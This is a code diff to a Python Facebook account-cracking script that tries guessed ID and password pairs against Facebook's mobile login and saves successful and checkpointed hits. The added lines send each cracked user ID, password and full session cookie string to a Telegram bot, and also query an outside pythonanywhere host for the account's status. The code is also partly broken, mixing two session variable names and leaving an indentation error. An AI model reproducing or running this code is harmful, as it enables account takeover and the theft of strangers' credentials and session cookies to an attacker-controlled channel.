@@ -1089,24 +1089,34 @@ def m2(idf,pwv):
    koki+=' m_pixel_ratio=2.625; wd=412x756'
    heade={'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate, br','Connection': 'keep-alive','Upgrade-Insecure-Requests': '1','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document','Cache-Control': 'max-age=0','Referer': 'https://mbasic.beta.facebook.com/','DNT': '1','Pragma': 'no-cache','TE': 'Trailers', }
    po = ses.post('https://mbasic.alpha.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221m9fi8lnukhyy1jeq4edioeifs1qqclpr1676q0j1vz8etbdf7xig%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dca99da58-d54d-40f5-9d81-a191f06ba982%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221m9fi8lnukhyy1jeq4edioeifs1qqclpr1676q0j1vz8etbdf7xig%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=bn_IN&pl_dbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-   if "checkpoint" in po.cookies.get_dict().keys():
-        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-        if 'y' in cp_xdx:
-         print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
-        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
-        cp+=1
-        break
-   elif "c_user" in ses.cookies.get_dict().keys():
-        ok+=1
-        coki=po.cookies.get_dict()
-        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-        idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{P} [{H}ATOM-OK{P}] {GREEN}{idf}|{pw}{xxx}')
-        if 'y' in cokix:
-         print(f'\r{gen}{H}'+kuki)
-        open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
-        break
-        
+   log_cookies=session.cookies.get_dict().keys()   
+   if 'c_user' in log_cookies:
+           coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+           user = re.findall('c_user=(.*);xs', coki)[0]
+           url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+           reqx = requests.get(url).text
+           if 'live' in reqx:
+                    print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+                    print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+                    statusok = (f" {user} | {ps} | {coki} ")
+                    requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                    open('/sdcard/ATOM-M2-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+                    ok+=1 
+                    break
+           if 'lock' in reqx:
+                    print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
+                    print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+                    open('/sdcard/ATOM-M2-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+                    ok+=1 
+                    break
+   elif 'checkpoint' in log_cookies:
+           coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+           coki1 = coki.split("1000")[1]
+           uid = "1000"+coki1[0:11]
+           if 'y' in cp_xdx:
+           print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
+           open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+           cp.append(uid)
    else:
         continue
   except requests.exceptions.ConnectionError:
